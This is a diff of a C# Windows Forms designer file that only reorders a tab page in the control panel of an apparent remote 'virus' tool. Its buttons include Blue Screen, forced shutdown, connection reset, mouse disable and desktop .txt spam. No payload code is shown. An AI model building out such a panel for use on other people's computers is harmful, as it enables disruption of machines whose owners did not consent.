@@ -34,8 +34,6 @@
             this.label1 = new System.Windows.Forms.Label();
             this.monoFlat_HeaderLabel1 = new MonoFlat.Class1.MonoFlat_HeaderLabel();
             this.metroTabControl1 = new MetroFramework.Controls.MetroTabControl();
-            this.metroTabPage4 = new MetroFramework.Controls.MetroTabPage();
-            this.monoFlat_ButtonTXTSpam = new MonoFlat.Class1.MonoFlat_Button();
             this.metroTabPage1 = new MetroFramework.Controls.MetroTabPage();
             this.monoFlat_ButtonPopUpMessage = new MonoFlat.Class1.MonoFlat_Button();
             this.Button_BlueScreen = new MonoFlat.Class1.MonoFlat_Button();
@@ -43,6 +41,8 @@
             this.Button_VirusConnectionReset = new MonoFlat.Class1.MonoFlat_Button();
             this.Button_VirusShutdown = new MonoFlat.Class1.MonoFlat_Button();
             this.Button_VirusExit = new MonoFlat.Class1.MonoFlat_Button();
+            this.metroTabPage4 = new MetroFramework.Controls.MetroTabPage();
+            this.monoFlat_ButtonTXTSpam = new MonoFlat.Class1.MonoFlat_Button();
             this.metroTabPage2 = new MetroFramework.Controls.MetroTabPage();
             this.Button_Maus_Simulate = new MonoFlat.Class1.MonoFlat_Button();
             this.Button_Maus_Disable = new MonoFlat.Class1.MonoFlat_Button();
@@ -74,8 +74,8 @@
             this.bunifuCustomLabel3 = new Bunifu.Framework.UI.BunifuCustomLabel();
             this.timerCheckForPic = new System.Windows.Forms.Timer(this.components);
             this.metroTabControl1.SuspendLayout();
-            this.metroTabPage4.SuspendLayout();
             this.metroTabPage1.SuspendLayout();
+            this.metroTabPage4.SuspendLayout();
             this.metroTabPage2.SuspendLayout();
             this.metroTabPage3.SuspendLayout();
             this.panel1.SuspendLayout();
@@ -127,8 +127,8 @@
             // 
             // metroTabControl1
             // 
-            this.metroTabControl1.Controls.Add(this.metroTabPage1);
             this.metroTabControl1.Controls.Add(this.metroTabPage4);
+            this.metroTabControl1.Controls.Add(this.metroTabPage1);
             this.metroTabControl1.Controls.Add(this.metroTabPage2);
             this.metroTabControl1.Controls.Add(this.metroTabPage3);
             this.metroTabControl1.CustomBackground = false;
@@ -144,41 +144,6 @@
             this.metroTabControl1.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
             this.metroTabControl1.Theme = MetroFramework.MetroThemeStyle.Light;
             this.metroTabControl1.UseStyleColors = false;
-            // 
-            // metroTabPage4
-            // 
-            this.metroTabPage4.Controls.Add(this.monoFlat_ButtonTXTSpam);
-            this.metroTabPage4.CustomBackground = false;
-            this.metroTabPage4.HorizontalScrollbar = false;
-            this.metroTabPage4.HorizontalScrollbarBarColor = true;
-            this.metroTabPage4.HorizontalScrollbarHighlightOnWheel = false;
-            this.metroTabPage4.HorizontalScrollbarSize = 10;
-            this.metroTabPage4.Location = new System.Drawing.Point(4, 35);
-            this.metroTabPage4.Name = "metroTabPage4";
-            this.metroTabPage4.Size = new System.Drawing.Size(473, 294);
-            this.metroTabPage4.Style = MetroFramework.MetroColorStyle.Blue;
-            this.metroTabPage4.StyleManager = null;
-            this.metroTabPage4.TabIndex = 3;
-            this.metroTabPage4.Text = "Datei-Verwaltung";
-            this.metroTabPage4.Theme = MetroFramework.MetroThemeStyle.Light;
-            this.metroTabPage4.VerticalScrollbar = false;
-            this.metroTabPage4.VerticalScrollbarBarColor = true;
-            this.metroTabPage4.VerticalScrollbarHighlightOnWheel = false;
-            this.metroTabPage4.VerticalScrollbarSize = 10;
-            // 
-            // monoFlat_ButtonTXTSpam
-            // 
-            this.monoFlat_ButtonTXTSpam.BackColor = System.Drawing.Color.Transparent;
-            this.monoFlat_ButtonTXTSpam.Font = new System.Drawing.Font("Segoe UI", 12F);
-            this.monoFlat_ButtonTXTSpam.Image = null;
-            this.monoFlat_ButtonTXTSpam.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
-            this.monoFlat_ButtonTXTSpam.Location = new System.Drawing.Point(12, 12);
-            this.monoFlat_ButtonTXTSpam.Name = "monoFlat_ButtonTXTSpam";
-            this.monoFlat_ButtonTXTSpam.Size = new System.Drawing.Size(150, 40);
-            this.monoFlat_ButtonTXTSpam.TabIndex = 3;
-            this.monoFlat_ButtonTXTSpam.Text = ".txt Spam";
-            this.monoFlat_ButtonTXTSpam.TextAlignment = System.Drawing.StringAlignment.Center;
-            this.monoFlat_ButtonTXTSpam.Click += new System.EventHandler(this.monoFlat_ButtonDektopTXT_Click);
             // 
             // metroTabPage1
             // 
@@ -291,6 +256,41 @@
             this.Button_VirusExit.Text = "Virus beenden";
             this.Button_VirusExit.TextAlignment = System.Drawing.StringAlignment.Center;
             this.Button_VirusExit.Click += new System.EventHandler(this.Button_VirusExit_Click);
+            // 
+            // metroTabPage4
+            // 
+            this.metroTabPage4.Controls.Add(this.monoFlat_ButtonTXTSpam);
+            this.metroTabPage4.CustomBackground = false;
+            this.metroTabPage4.HorizontalScrollbar = false;
+            this.metroTabPage4.HorizontalScrollbarBarColor = true;
+            this.metroTabPage4.HorizontalScrollbarHighlightOnWheel = false;
+            this.metroTabPage4.HorizontalScrollbarSize = 10;
+            this.metroTabPage4.Location = new System.Drawing.Point(4, 35);
+            this.metroTabPage4.Name = "metroTabPage4";
+            this.metroTabPage4.Size = new System.Drawing.Size(473, 294);
+            this.metroTabPage4.Style = MetroFramework.MetroColorStyle.Blue;
+            this.metroTabPage4.StyleManager = null;
+            this.metroTabPage4.TabIndex = 3;
+            this.metroTabPage4.Text = "Datei-Verwaltung";
+            this.metroTabPage4.Theme = MetroFramework.MetroThemeStyle.Light;
+            this.metroTabPage4.VerticalScrollbar = false;
+            this.metroTabPage4.VerticalScrollbarBarColor = true;
+            this.metroTabPage4.VerticalScrollbarHighlightOnWheel = false;
+            this.metroTabPage4.VerticalScrollbarSize = 10;
+            // 
+            // monoFlat_ButtonTXTSpam
+            // 
+            this.monoFlat_ButtonTXTSpam.BackColor = System.Drawing.Color.Transparent;
+            this.monoFlat_ButtonTXTSpam.Font = new System.Drawing.Font("Segoe UI", 12F);
+            this.monoFlat_ButtonTXTSpam.Image = null;
+            this.monoFlat_ButtonTXTSpam.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
+            this.monoFlat_ButtonTXTSpam.Location = new System.Drawing.Point(12, 12);
+            this.monoFlat_ButtonTXTSpam.Name = "monoFlat_ButtonTXTSpam";
+            this.monoFlat_ButtonTXTSpam.Size = new System.Drawing.Size(150, 40);
+            this.monoFlat_ButtonTXTSpam.TabIndex = 3;
+            this.monoFlat_ButtonTXTSpam.Text = ".txt Spam";
+            this.monoFlat_ButtonTXTSpam.TextAlignment = System.Drawing.StringAlignment.Center;
+            this.monoFlat_ButtonTXTSpam.Click += new System.EventHandler(this.monoFlat_ButtonDektopTXT_Click);
             // 
             // metroTabPage2
             // 
@@ -759,8 +759,8 @@
             this.TransparencyKey = System.Drawing.Color.Fuchsia;
             this.FormClosed += new System.Windows.Forms.FormClosedEventHandler(this.ClientVerwaltung_FormClosed);
             this.metroTabControl1.ResumeLayout(false);
-            this.metroTabPage4.ResumeLayout(false);
             this.metroTabPage1.ResumeLayout(false);
+            this.metroTabPage4.ResumeLayout(false);
             this.metroTabPage2.ResumeLayout(false);
             this.metroTabPage3.ResumeLayout(false);
             this.panel1.ResumeLayout(false);
